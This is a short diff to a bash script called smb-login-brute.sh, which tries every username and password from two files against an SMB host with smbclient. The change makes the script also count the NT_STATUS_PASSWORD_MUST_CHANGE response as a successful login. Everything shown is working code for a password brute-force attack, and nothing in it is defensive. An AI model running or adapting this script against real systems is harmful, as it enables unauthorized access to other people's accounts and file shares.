@@ -5,6 +5,7 @@ GR='\033[0;32m'
 failed='NT_STATUS_LOGON_FAILURE'
 timed_out='NT_STATUS_IO_TIMEOUT'
 success='Sharename'
+success1='NT_STATUS_PASSWORD_MUST_CHANGE'
 if [ "$#" -ne 3 ]; then
 	echo "usage: ./smb-login-brute.sh user-file.txt password-file.txt host"
 	exit
@@ -27,6 +28,9 @@ for i in $(cat $1);do
 			printf "${GR}[+] login successful $i:$j\n"
 			echo $j | smbclient -L $3 -U $i
 		fi
+		if [[ "$res" == *"$success1"* ]]; then
+                        printf "${GR}[+] login successful $i:$j\n"
+                fi
 		if [[ "$res" == *"$timed_out"* ]]; then
 			printf "${RED}[-] Connection timed out !\n"
 		fi
